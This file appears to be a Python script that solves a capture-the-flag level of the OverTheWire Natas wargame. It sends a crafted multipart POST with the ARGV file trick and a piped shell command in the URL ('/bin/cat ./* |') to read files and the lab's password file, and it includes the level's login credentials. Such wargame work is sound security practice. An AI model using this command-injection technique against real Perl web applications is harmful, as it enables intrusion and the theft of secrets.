import requests
def pretty_print_POST(req):
    """
    At this point it is completely built and ready
    to be fired; it is "prepared".

    However pay attention at the formatting used in 
    this function because it is programmed to be pretty 
    printed and may differ from the actual request.
    """
    print('{}\n{}\n{}\n\n{}'.format(
        '-----------START-----------',
        req.method + ' ' + req.url,
        '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    ))

user_auth = ('natas32','no1vohsheCaiv3ieH4em1ahchisainge')

#target = 'http://httpbin.org/post'
target = 'http://natas32.natas.labs.overthewire.org/index.pl?/bin/cat ./* |'
#target = 'http://natas32.natas.labs.overthewire.org/index.pl?./getpassword |'


#proxy = '127.0.0.1:8080'
#proxy = {'http': 'http://127.0.0.1:8080'}



file2 = [
    ('file', ('csv2.csv',open('csv2.csv', 'rb'))), 
    ('file', ('csv1.csv',open('csv1.csv', 'rb')))]
payload = {'file':'/etc/natas_webpass/natas32'}
payload = {'file':'ARGV'}
#payload = [('file','index.pl'), ('file','/etc/natas_webpass/natas32'), ('file','35'), ('file', '*')]
#payload = {'file':}

file1 = {'file': ("cat",open('csv2.csv', 'rb'))}



#header = {'Content-Type': 'multipart/form-data'}



req = requests.Request('POST', target, auth = user_auth, data = payload, files = file1)


prep = req.prepare()
print pretty_print_POST(prep)
s = requests.Session()

response = s.send(prep)


print '-' * 60


print response.text




